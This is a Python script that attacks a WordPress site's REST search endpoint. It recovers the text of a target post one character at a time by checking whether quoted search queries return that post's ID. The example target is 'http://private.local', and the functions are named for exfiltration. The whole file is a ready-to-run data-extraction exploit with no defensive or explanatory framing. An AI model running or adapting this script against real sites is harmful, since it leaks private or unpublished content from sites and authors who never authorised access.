import requests
import string

def search_wp_api(base_url, query):
    url = f"{base_url}/wp-json/wp/v2/search?search={query}"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    else:
        return []

def exfiltrate_content(base_url, target_id):
    char_set = string.ascii_letters + string.digits + " "
    exfiltrated_content = ""
    print("Starting exfiltration...")
    
    for char in char_set:
        encoded_char = "%20" if char == " " else char
        query = f'>{encoded_char}'
        quoted_query = f'"{query}"'
        print(f"Testing first character: {repr(char)}")
        results = search_wp_api(base_url, quoted_query)
        if any(item['id'] == target_id for item in results):
            exfiltrated_content = f'>{encoded_char}'
            print(f"First character found: {repr(char)}")
            break
    
    if not exfiltrated_content:
        print("No valid first character found.")
        return ""

    while True:
        found = False
        for char in char_set:
            encoded_char = "%20" if char == " " else char
            potential_content = f'{exfiltrated_content}{encoded_char}'
            quoted_query = f'"{potential_content}"'
            print(f"Testing next character: {repr(char)} -> {potential_content}")
            results = search_wp_api(base_url, quoted_query)
            if any(item['id'] == target_id for item in results):
                exfiltrated_content = potential_content
                print(f"Character added: {repr(char)} -> {exfiltrated_content}")
                found = True
                break
        
        if not found:
            print("No more characters can be added.")
            break

    print("Exfiltration complete.")
    return exfiltrated_content[1:].replace("%20", " ")

# Example usage
if __name__ == "__main__":
    base_url = "http://private.local"
    target_id = 1

    exfiltrated_content = exfiltrate_content(base_url, target_id)
    print("Exfiltrated Content:", exfiltrated_content)
